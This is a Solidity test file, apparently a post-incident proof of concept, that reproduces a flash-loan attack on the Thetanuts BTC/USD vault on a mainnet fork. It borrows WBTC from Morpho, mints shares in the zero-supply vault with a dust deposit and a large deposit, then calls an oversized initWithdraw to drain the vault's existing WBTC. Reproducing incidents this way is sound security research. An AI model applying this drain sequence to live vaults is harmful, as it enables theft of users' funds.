// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.15 WBTC
// Attacker : 0xaea2d93328242389b3e34271252b1bc9253b718a
// Attack Contract : 0xe26f5a496db55de2a69bdc4eef023927b3c2a209
// Vulnerable Contract : 0x80b8eeb34a2ba5dd90c61e02a12ea30515dca6f5
// Attack Tx : https://etherscan.io/tx/0x1bc83899060c27106b6fb4257b208925085794e83b21c444854442fd3554862c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x80b8eeb34a2ba5dd90c61e02a12ea30515dca6f5#code

// @Analysis
// Source : https://t.me/defimon_alerts/2933
//
// The Thetanuts BTC/USD covered call vault held WBTC while totalSupply() was zero.
// The attacker flash-loaned WBTC, minted shares with two deposits, and called
// initWithdraw(uint256) to redeem nearly all of the vault's pre-existing WBTC.

address constant ATTACKER = 0xAea2d93328242389B3e34271252b1bC9253b718a;
address constant HISTORICAL_ATTACK_CONTRACT = 0xE26F5a496db55De2a69Bdc4EEF023927B3c2A209;
address constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant THETANUTS_BTC_USD_VAULT = 0x80b8EEb34A2Ba5dd90c61e02a12eA30515dCa6f5;

uint256 constant FORK_BLOCK = 24_923_218;
uint256 constant WBTC_UNIT = 1e8;
uint256 constant FLASH_LOAN_AMOUNT = 10 * WBTC_UNIT;

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant wbtc = IERC20(WBTC);
    IThetanutsVault private constant vault = IThetanutsVault(THETANUTS_BTC_USD_VAULT);
    IMorphoBuleFlashLoan private constant morpho = IMorphoBuleFlashLoan(MORPHO_BLUE);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = WBTC;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(MORPHO_BLUE, "Morpho Blue");
        vm.label(WBTC, "WBTC");
        vm.label(THETANUTS_BTC_USD_VAULT, "Thetanuts BTC/USD Vault");
    }

    function testExploit() public balanceLog {
        uint256 attackerBalanceBefore = wbtc.balanceOf(ATTACKER);
        uint256 preExistingVaultWbtc = wbtc.balanceOf(THETANUTS_BTC_USD_VAULT);
        assertGt(preExistingVaultWbtc, 0, "vault already holds WBTC");
        assertEq(vault.totalSupply(), 0, "vault has zero shares before exploit");
        assertEq(vault.balanceOf(address(this)), 0, "local attacker starts without vault shares");
        assertEq(vault.balanceOf(HISTORICAL_ATTACK_CONTRACT), 0, "historical attack contract starts without shares");

        wbtc.approve(THETANUTS_BTC_USD_VAULT, type(uint256).max);
        wbtc.approve(MORPHO_BLUE, type(uint256).max);

        // step 1: borrow WBTC from Morpho; Morpho calls onMorphoFlashLoan.
        morpho.flashLoan(WBTC, FLASH_LOAN_AMOUNT, "");

        uint256 profit = wbtc.balanceOf(address(this));

        // step 5: forward the same final WBTC profit to the attacker EOA.
        wbtc.transfer(ATTACKER, profit);
        uint256 receiverProfit = wbtc.balanceOf(ATTACKER) - attackerBalanceBefore;
        assertEq(receiverProfit, profit, "profit forwarded");
        assertGt(receiverProfit, preExistingVaultWbtc * 99 / 100, "receiver captures vault pre-balance");

        uint256 residualVaultWbtc = wbtc.balanceOf(THETANUTS_BTC_USD_VAULT);
        assertEq(profit, preExistingVaultWbtc - residualVaultWbtc, "profit comes from vault pre-balance");
        assertGt(profit, 0, "profitable WBTC drain");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO_BLUE, "only Morpho callback");
        require(assets == FLASH_LOAN_AMOUNT, "unexpected loan amount");

        // step 2: seed the zero-supply vault with the observed dust deposit.
        uint256 firstDeposit = 2;
        uint256 firstShares = vault.deposit(firstDeposit);
        assertEq(firstShares, 1, "dust deposit mints one share");

        // step 3: deposit the main WBTC amount at the vulnerable share rate.
        uint256 secondDeposit = 468_000_000;
        uint256 secondShares = vault.deposit(secondDeposit);
        assertEq(secondShares, secondDeposit, "main deposit mints expected shares");
        assertEq(vault.balanceOf(address(this)), firstShares + secondShares, "attacker holds all minted shares");

        // step 4: an oversized withdraw request burns the attacker shares and releases the vault balance.
        uint256 withdrawn = vault.initWithdraw(type(uint256).max);
        assertGt(withdrawn, secondDeposit, "withdraw includes pre-existing vault WBTC");
        assertEq(vault.balanceOf(address(this)), 0, "shares burned");
    }
}

interface IThetanutsVault {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 amount) external returns (uint256 shares);
    function initWithdraw(uint256 shares) external returns (uint256 assets);
}
